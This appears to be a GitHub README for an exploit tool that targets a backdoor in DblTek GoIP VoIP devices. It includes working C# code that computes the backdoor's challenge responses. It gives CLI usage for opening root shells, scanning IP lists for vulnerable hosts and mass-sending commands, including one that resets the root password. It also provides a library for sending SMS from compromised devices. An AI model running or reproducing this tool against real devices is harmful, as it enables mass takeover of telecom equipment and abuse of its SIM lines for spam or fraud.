# DblTekGoIPPwn

Tool to exploit challenge response system in vulnerable DblTek GoIP devices. Can generate responses to
specified challenges, test hosts for the vulnerability, run commands on vulnerable hosts, send SMS messages from a host, and drop
into a root shell on any vulnerable host.

## The Vulnerability

On March 2nd, 2017, Trustwave released a vulnerability that security researchers found in the DblTek
GoIP VoIP Phone. The vulnerability was a backdoor in the firmware for an account named 'dbladm'. When
a user entered this as their username in a telnet prompt, the system would present a challenge that when
followed with the right response, gave the user a root shell on the system.

The problem with such a challenge response system is that the devices are as secure as the algorithm for
generating the responses, which was reverse engineered from firmware binaries provided by DblTek. Using this
algorithm, a root shell can be aquired on ANY DblTek GoIP device.

Original Article: https://www.trustwave.com/Resources/SpiderLabs-Blog/Undocumented-Backdoor-Account-in-DBLTek-GoIP/

Using the description of the backdoor provided in the article, I was able to write what I believe to be
some of the first exploit code for this vulnerability. The core of this is of course the algorithm to
generate the response based on a given challenge. Here is a function to do this written in C#.

```C#
static string ComputeResponse(string challengeStr)
{
    int challenge = Convert.ToInt32(challengeStr.Substring(1)); // Get just the number after 'N'.

    string modified = (challenge + 20139 + (challenge >> 3)).ToString(); // Perform some dummy 1337 operations.

    byte[] buffer = new byte[64];
    // Copy the string into the first part of the buffer.
    for (int i = 0; i < modified.Length; i++)
        buffer[i] = (byte)modified[i];

    var md5 = MD5.Create();
    byte[] hash = md5.ComputeHash(buffer); // Calculate the MD5 of the buffer.

    StringBuilder sb = new StringBuilder(); // Will hold the results.
    // Take the unpadded hex value of the first six bytes of the MD5.
    for (int i = 0; i < 6; i++)
        sb.Append(hash[i].ToString("x"));

    return sb.ToString(); // Profit
}
```

## DblTekGoIPPwn Command Line Interface (CLI)

When DblTekPwn is ran without arguments, the help is displayed. This is the output:

```
USAGE: DblTekPwn.exe [MODE] [HOSTS] [OUTPUT]

[MODE]:
-c --compute-response [CHALLENGE]         Computes a response to the given challenge.
-r --root-shell                           Starts a root shell with the vulnerable host.
-s --send-commands    [COMMAND_FILE]      Sends commands from a file to vulnerable hosts.
-t --test                                 Tests hosts and determines if they are vulnerable.
-h --help                                 Displays this help and exits.

[HOSTS]:
-n --name             [IP]                Specifies a single IP address.
-f --file             [IP_FILE]           Specifies a file with IP\nIP\nIP.

[OUTPUT]:
-o --output           [OUTPUT_FILE]       Specifies an output file. Default stdin.
```

## Examples

### Getting a Root Shell on a Vulnerable System

DblTekGoIPPwn makes it easy to get a root shell on any vulnerable system. Simply run the
following command using the vulnerable IP.

```
DblTekPwn.exe --root-shell --name 192.168.1.1
```

You will see output that looks like this:
```
Password: ***********

```

From here you can begin entering commands (there is no shell prompt).

### Calculating a Challenge Response

Say you wanted to calculate the response to a GoIP challenge ```N1746203308```. You would just
run the following command.

```
DblTekPwn --compute-response N1746203308
```

The output will be the response:
```
d6176d3aab2
```

### Checking a List of IPs

Say you wished to check ```list.txt``` of IPs for GoIPs that are vulnerable and send this output
to ```results.txt```. First make sure that the IPs are in format ```ip:port``` (port is default 23)
and that the IPs are seperated by a newline ```\n```. The following command could then be ran.

```
DblTekPwn.exe --test --file list.txt --output results.txt
```

list.txt:
```
192.168.1.0
192.168.1.1
192.168.1.2:1337
192.168.1.3
192.168.1.4:2323
```

results.txt:
```
192.168.1.0 False
192.168.1.1 True
192.168.1.2:1337 True
192.168.1.3 False
192.168.1.4:2323 False
```

The ```False``` or ```True``` after the host indicates whether or not the IP is vulnerable.

### Sending Commands to a List of IPs

Say you had a list of commands (which is really a list of telnet inputs) in ```cmds.txt```
to send to ```list.txt``` of IPs and send the output to ```results.txt```. First make sure
that the IPs are in format ```ip:port``` (port is default 23) and that BOTH the IPs AND commands
are seperated by a newline ```\n``` in their respective files. The following command could then
be ran.

```
DblTekPwn.exe --send-commands cmds.txt --file list.txt --output results.txt
```

list.txt:
```
192.168.1.0
192.168.1.1
192.168.1.2:1337
192.168.1.3
192.168.1.4:2323
```

cmds.txt:
```
passwd root
toor
toor

exit
```

results.txt:
```
192.168.1.0 False
192.168.1.1 True
192.168.1.2:1337 True
192.168.1.3 False
192.168.1.4:2323 False
```

The ```False``` or ```True``` after the host indicates whether or not the connection was successfully
made and the commands delivered.

## Using the DblTekPwn.SMS Library

The code in this GitHub repository provides an abstraction for sending SMS (text) messages from a hacked GoIP. To use this code,
include DblTekPwn.exe in your application and add the following ```using``` statement.

```C#
using DblTekPwn.SMS
```

Now in your code you can use the static ```SmsSender.SendSms``` method. Here are a few examples.

### Sending SMS From a Single Number to a Single Number

```C#
string[] nums = new string[] { "18005551234" };
string goIP = "192.168.1.3";
string msg = "Hello, World!";
SmsSender.SendSms(goIP, 23, nums, msg);
```

### Sending SMS From Multiple Numbers to a Single Number

Most GoIPs have up to 32 SIM cards onboard, allowing the hacker to send SMS messages from all of these lines.

```C#
string[] nums = new string[] { "18005551234" };
string goIP = "192.168.1.3";
string msg = "Hai";
int numbers = 15;
SmsSender.SendSms(goIP, 23, nums, msg, 1, numbers);
```

### Sending SMS From Multiple Numbers to Multiple Numbers

```C#
strings[] nums = new string[] { "18005551234", "18005554321", "18005551337" };
string goIP = "192.168.1.3";
string msg = "We are legion";
int numbers = 32;
SmsSender.SendSms(goIP, 23, nums, msg, 1, numbers);
```
